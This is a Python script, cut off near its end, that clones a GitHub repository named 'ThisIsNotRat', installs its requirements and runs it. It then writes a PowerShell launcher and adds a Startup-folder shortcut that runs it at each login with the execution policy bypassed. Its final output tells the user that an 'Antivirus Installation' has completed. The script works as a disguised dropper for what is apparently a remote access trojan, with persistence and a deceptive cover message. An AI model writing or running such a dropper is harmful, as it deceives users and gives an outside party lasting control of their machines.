import os
import subprocess
from pathlib import Path

# ------------------ CONFIG ------------------
REPO_URL = "https://github.com/Safir-Akhtar/ThisIsNotRat.git"
CLONE_DIR = Path.home() / "ThisIsNotRat"
MAIN_SCRIPT = "main.py"  # Change if your main file is different
PS_SCRIPT_PATH = Path.home() / "RunThisIsNotRat.ps1"
# -------------------------------------------

def run_cmd(cmd):
    """Run a command in PowerShell."""
    subprocess.run(["powershell", "-Command", cmd], shell=True)

# 1. Commands to run sequentially in PowerShell
commands = [
    f"Write-Host 'Cloning repo...' ; git clone {REPO_URL} '{CLONE_DIR}'" if not CLONE_DIR.exists() else f"Write-Host 'Repo exists. Pulling...' ; git -C '{CLONE_DIR}' pull",
    f"Write-Host 'Installing requirements...' ; pip install -r '{CLONE_DIR / 'requirements.txt'}'",
    f"Write-Host 'Running main script...' ; python '{CLONE_DIR / MAIN_SCRIPT}'"
]

for cmd in commands:
    run_cmd(cmd)

# 2. Create PowerShell startup script
ps_content = f"""
cd "{CLONE_DIR}"
python {MAIN_SCRIPT}
"""
PS_SCRIPT_PATH.write_text(ps_content)

# 3. Add shortcut to startup folder
startup = Path(os.getenv("APPDATA")) / "Microsoft\\Windows\\Start Menu\\Programs\\Startup"
shortcut_path = startup / "RunThisIsNotRat.lnk"

try:
    import pythoncom
    from win32com.client import Dispatch

    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(str(shortcut_path))
    shortcut.Targetpath = "powershell.exe"
    shortcut.Arguments = f'-ExecutionPolicy Bypass -File "{PS_SCRIPT_PATH}"'
    shortcut.WorkingDirectory = str(CLONE_DIR)
    shortcut.save()
except ImportError:
    print("[!] pywin32 required to create startup shortcut. Install: pip install pywin32")

# 4. Final success message in large green text and exit
final_message = """
$Host.UI.RawUI.ForegroundColor = 'Green'
Write-Host '
##########################################################
#                                                        #
#        Antivirus Installation Completed!              #
#                      